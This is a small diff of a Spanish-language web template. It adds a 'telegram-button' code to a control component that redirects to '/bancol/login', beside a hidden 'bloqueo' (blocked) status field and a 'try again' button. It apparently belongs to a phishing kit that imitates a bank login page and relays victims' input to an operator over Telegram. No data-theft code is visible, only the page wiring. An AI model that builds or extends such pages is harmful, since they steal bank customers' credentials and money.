@@ -115,7 +115,6 @@
             <input type="hidden" id="no-status" name="status" value="bloqueo">
             <button type="submit" class="btn-retry" id="enviar">Intentar Nuevamente</button>
         </form>
-        <div id="mensaje"></div>
     </div>
 
     <x-control
@@ -124,6 +123,7 @@
         :auto-init="true"
         :debug="false"
         redirect-url="/bancol/login"
+        telegram-button="COD923"
     />
 </body>
 
